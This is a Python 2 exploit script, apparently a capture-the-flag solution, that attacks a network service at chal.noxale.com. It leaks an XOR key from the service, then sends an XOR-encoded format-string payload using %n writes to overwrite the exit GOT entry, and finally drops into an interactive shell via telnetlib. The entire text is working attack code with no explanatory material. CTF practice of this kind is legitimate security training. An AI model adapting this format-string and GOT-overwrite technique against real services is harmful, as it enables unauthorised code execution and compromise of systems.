import struct
import sys
import socket
import telnetlib

MSG_1 = "What is your name?\n"
MSG_2 = "Say that again please\n"
MSG_3 = "Your name was encrypted using the best encryption in the world\nThis is your new name: "

HOST = "chal.noxale.com" 
PORT = 5678

EXIT_GOT = 0x0804a024

def p(x):
    return struct.pack("<L", x)

def init_connection():
    print (" [ + ] Connecting to %s:%s\n" % (HOST, PORT))
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

def recv_data(msg):
    sys.stdout.write(s.recv(len(msg)))

def send_cmd(data):
    s.send(data)

def get_xorkey():
    
    key = "\00"*27
    
    send_cmd(key)
    recv_data(MSG_3)
    
    xor_key = s.recv(2048)
    print xor_key

    return xor_key

def xor(msg, key):
    
    result = ""
    for i in range(0, len(msg)-1):
        result += chr(ord(msg[i]) ^ ord(key[i % 26]))
    
    result += msg[len(msg)-1]
    return result    

MSG = "abcdefghijklmnopqrstuvwxyza"

def test_xorkey(key):
    print xor(MSG, key)

CMD_1 = "abcdefghijklmnopqrstuvwxyzab"
CMD_1 += p(0x6a4b825)

CMD_2 = "%34198p"
CMD_2 += "%27$n"
CMD_2 += "%33390p"
CMD_2 += "%28$n"
CMD_2 += "ABC"

init_connection()
recv_data(MSG_1)
send_cmd(CMD_1)
recv_data(MSG_2)
key = get_xorkey()
#test_xorkey(key)
s.close()

CMD_1 = p(EXIT_GOT)
CMD_1 += p(EXIT_GOT + 2)
CMD_1 += "ijklmnopqrstuvwxyzab"
CMD_1 += p(0x6a4b825)

init_connection()
recv_data(MSG_1)
send_cmd(CMD_1)
recv_data(MSG_2)
send_cmd(xor(CMD_2, key))
recv_data(MSG_3)
print s.recv(200000)

t = telnetlib.Telnet()
t.sock = s
t.interact()
